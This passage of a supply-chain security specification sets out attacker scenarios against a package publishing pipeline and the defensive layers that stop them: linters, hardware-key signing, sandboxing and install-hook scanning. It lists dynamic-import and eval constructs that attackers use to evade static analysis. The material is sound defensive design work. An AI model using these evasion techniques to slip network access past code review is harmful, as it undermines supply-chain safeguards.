| 1 | Create package, no manifest | Layer 4 (CI Gate) | Publish refuses — no `required_capabilities.json` |
| 2 | Add manifest with `net:connect` | Layer 5 (Hardware Key) | **Blocked** — no signed approval |
| 3 | Even if bypassed, trigger publish | Registry gate | PyPI Trusted Publisher not registered for this name |

**Outcome:** New packages face the strictest barriers.

### Scenario 3: Modify CI workflow to remove gates

**Attack vector:** Edit `publish.yml` to remove the `capability-gate` job.

| Step | Attacker Action | Layer Hit | Result |
|------|----------------|-----------|--------|
| 1 | Push commit modifying workflow | CODEOWNERS | `.github/workflows/` requires review |
| 2 | Force-merge (admin) | GitHub environment rules | Publish env requires manual approval |
| 3 | Even if bypassed | Audit trail | Git history + GitHub audit log |

**Outcome:** Requires admin privileges AND highly visible trail.

### Scenario 4: Dependency confusion attack

**Attack vector:** Register malicious `ca-logic-gates-utils` on PyPI.

| Step | Attacker Action | Layer Hit | Result |
|------|----------------|-----------|--------|
| 1 | Register malicious public package | Layer 0 (Zero Deps) | **No effect** — published packages have `install_requires: []` |

**Outcome:** Attack surface does not exist. Nothing to confuse.

### Scenario 5: Install-time malware

**Attack vector:** Add `setup.py` with post-install hook.

| Step | Attacker Action | Layer Hit | Result |
|------|----------------|-----------|--------|
| 1 | Add setup.py with custom install command | Layer 0b (No Hooks) | CI scans artifact — **blocked** |
| 2 | Even if bypassed | Layer 6 (Sandbox) | Hook runs with no network — kernel blocks exfiltration |

**Outcome:** Install hooks are banned and verified.

### Scenario 6: Static analysis evasion via dynamic execution

**Attack vector:** Use `eval()` or `__import__()` to dynamically import socket.

| Step | Attacker Action | Layer Hit | Result |
|------|----------------|-----------|--------|
| 1 | Use `__import__("socket")` | Layer 3 (Linter) | **Hard fail** — banned construct |
| 2 | Use `eval("import socket")` | Layer 3 (Linter) | **Hard fail** — banned construct |
| 3 | Use `getattr(__builtins__, "open")` | Layer 3 (Linter) | **Hard fail** — banned construct |
| 4 | Must use `import socket` directly | Layer 4 (CI Gate) | Static analyzer catches it |

**Outcome:** Banning dynamic execution closes the obfuscation escape hatch.

### Scenario 7: Publish from rogue branch

**Attack vector:** Create branch with malicious code, create signed tag pointing to it.

| Step | Attacker Action | Layer Hit | Result |
|------|----------------|-----------|--------|
| 1 | Create branch, tag commit | Tag verification | Tag must point to commit on `main` — **blocked** |
| 2 | Merge to main first | Layers 3-5 | All friction layers apply to the merge |

**Outcome:** Tags not on main are rejected.

### Scenario 8: Add attacker's signing key to CAPABILITY_SIGNERS

**Attack vector:** Add attacker's SSH public key to `CAPABILITY_SIGNERS`.

| Step | Attacker Action | Layer Hit | Result |
|------|----------------|-----------|--------|
| 1 | Push commit adding key | CODEOWNERS | Requires review from existing signer |
| 2 | Even if bypassed | CI verification | Changes must be signed by pre-existing key |

**Outcome:** Circular protection — adding a signer requires an existing signer's YubiKey.

---

## Publish Trigger Mechanism

### Python and Ruby: Approval-File Trigger

Publishing is triggered by merging a hardware-key-signed approval file to main. There are
no tags, no GitHub Releases, no `workflow_dispatch` buttons. The approval file IS the
trigger AND the authorization.

```
publish_approvals/
├── python-logic-gates-v0.1.0.json      # approval for this version
├── python-logic-gates-v0.1.0.json.sig  # detached SSH signature
├── ruby-logic-gates-v0.1.0.json
└── ruby-logic-gates-v0.1.0.json.sig
```

The CI workflow detects new files in `publish_approvals/` on each push to main. For each
new approval file:

1. Verify the signature against `CAPABILITY_SIGNERS`.
2. Verify the commit SHA in the approval matches what's on main.
3. Run the capability gate (static analysis + sandbox fuzz).
4. If all checks pass, publish to the registry.

This design means an attacker needs a hardware-key signature to trigger a publish. There
is no separate mechanism to attack.

### Go: Signed Tags

Go modules require git tags for version resolution (`go get pkg@v1.2.3`). Tags are
protected by GitHub repository rulesets:

- Pattern: `go/**`
- Requires signed tags (hardware-key-signed)
- Requires tagged commit to pass all status checks
- "Do not allow bypass" enabled — even admins cannot create unsigned tags

---

## Implementation Packages

### Package Naming

All security packages use the `ca_` prefix:

| Language | Package Name | Location |
|----------|-------------|----------|
| Python | `ca-capability-analyzer` | `code/packages/python/ca-capability-analyzer/` |
| Python | `ca-secure-io` | `code/packages/python/ca-secure-io/` |
| Ruby | `ca_capability_analyzer` | `code/packages/ruby/ca_capability_analyzer/` |
| Ruby | `ca_secure_io` | `code/packages/ruby/ca_secure_io/` |
| Go | `ca-capability-analyzer` | `code/packages/go/ca-capability-analyzer/` |
| Go | `ca-secure-io` | `code/packages/go/ca-secure-io/` |

### Tools

| Tool | Language | Location |
|------|----------|----------|
| `publish-approve` | Go | `code/programs/go/publish-approve/` |
| `sandbox-runner` | Go | `code/programs/go/sandbox-runner/` |
| `install-hook-scanner` | Go | `code/programs/go/install-hook-scanner/` |

---

## Implementation Phases

### Phase 1: Specification and Manifests
- This specification document
- JSON Schema for `required_capabilities.json`
- Add `required_capabilities.json` to all existing packages
- No enforcement — just the data

### Phase 2: Static Analyzers
- Build `ca-capability-analyzer` for Python, Ruby, Go
- Validate against all existing packages
- Add to BUILD files (warnings first, then blocking)

### Phase 3: Secure Wrappers and Linter Rules
- Build `ca-secure-io` wrappers for each language
- Build linter rules for each language
- Migrate lexer/parser packages to use wrappers

### Phase 4: Dependency Vendoring
- Extend build tool with vendoring capability
- Strip external dependencies from published metadata
- Implement `vendor_manifest.json` generation

### Phase 5: Hardware-Key Approval
- Build `publish-approve` CLI tool
- Set up `CAPABILITY_SIGNERS`
- Add approval verification to CI

### Phase 6: Sandbox Fuzz Verification
- Build sandbox runner using Landlock + seccomp-BPF
- Add fuzz targets to packages
- Integrate into publish pipeline

### Phase 7: Publish Gate Integration
- Redesign publish workflow (approval-file trigger for Python/Ruby, signed tags for Go)
- Add install-hook scanner
- Migrate Ruby to OIDC Trusted Publishing
- Configure CODEOWNERS and GitHub rulesets

---

## References

### Real-World Attacks That Motivated This Design

- **XZ Utils backdoor (2024):** Social engineering to become a maintainer over 2.6 years.
  Motivated: hardware-key requirement for all merges (Layer 5).
- **event-stream (2018):** Malicious sub-dependency added by compromised maintainer.
  Motivated: zero external dependencies (Layer 0).
- **ua-parser-js (2021):** npm account hijacked via credential theft.
  Motivated: hardware-key gate independent of account credentials (Layer 5).
- **colors/faker (2022):** Maintainer intentionally sabotaged own packages.
  Motivated: capability manifest prevents adding undeclared capabilities (Layer 1).
- **chalk/debug (2025):** TOTP-based 2FA phished in real time.
  Motivated: FIDO2 hardware keys instead of TOTP (Layer 5).
- **Shai-Hulud worm (2025):** Self-propagating via stolen credentials.
  Motivated: zero dependencies eliminates propagation vector (Layer 0).

### Theoretical Foundations

- **Principle of Least Privilege** (Saltzer and Schroeder, 1975)
- **Confused Deputy Problem** (Hardy, 1988)
- **Capability-Based Security** (Dennis and Van Horn, 1966)
- **OpenBSD pledge() and unveil()** — the model for our capability taxonomy
- **Linux Landlock LSM** — the model for our sandbox enforcement
